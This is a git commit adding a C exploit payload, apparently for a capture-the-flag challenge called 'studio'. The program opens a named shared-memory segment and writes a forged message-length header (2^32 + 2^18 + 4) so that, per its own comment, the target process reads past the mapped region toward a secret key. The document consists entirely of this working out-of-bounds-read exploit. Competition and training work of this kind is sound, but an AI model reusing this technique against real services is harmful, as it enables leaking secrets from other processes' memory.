2ee99218b12bc1aba6700b36f85f2ffc3fa7ce79
usernamedt <usernamedt@protonmail.ch>
2021-10-03 17:30:18 +0300

    Add studio writeup

---
+++ sploits/studio/payload/main.c
@@ -0,0 +1,46 @@
+#include <stdio.h>
+#include <sys/mman.h>
+#include <fcntl.h>
+#include <string.h>
+#include <stdlib.h>
+#include <sys/stat.h>
+#define STORAGE_SIZE 320000
+
+int main(int argc, char *argv[]) {
+    int fd;
+    size_t len;
+    void * addr;
+    void * p;
+
+    if(argc<=1) {         printf("usage: [bin] mem_id\n");         exit(1);      }
+
+
+    // get shared memory file descriptor
+    fd = shm_open(argv[1], O_RDWR, S_IWUSR);
+    if (fd == -1)
+    {
+        perror("open");
+        return 10;
+    }
+
+    char * to_write = "abc2";
+
+    // map shared memory to process address space
+    addr = mmap(NULL, STORAGE_SIZE, PROT_WRITE, MAP_SHARED, fd, 0);
+    if (addr == MAP_FAILED)
+    {
+        perror("mmap");
+        return 30;
+    }
+
+    p = addr;
+    len = strlen(to_write);
+    size_t actual_len = 4295229444; // 2^32 (needed to read the process memory after the mmap'ed region) + 2^18 (needed to mmap near to the secret key) + 2^2 ("abc2" length)
+    //write the length of the message to the header
+    memcpy(p, &actual_len, sizeof(size_t));
+    p += sizeof(size_t);
+    //write the data to the memory
+    memcpy(p, to_write, len);
+
+    return 0;
+}
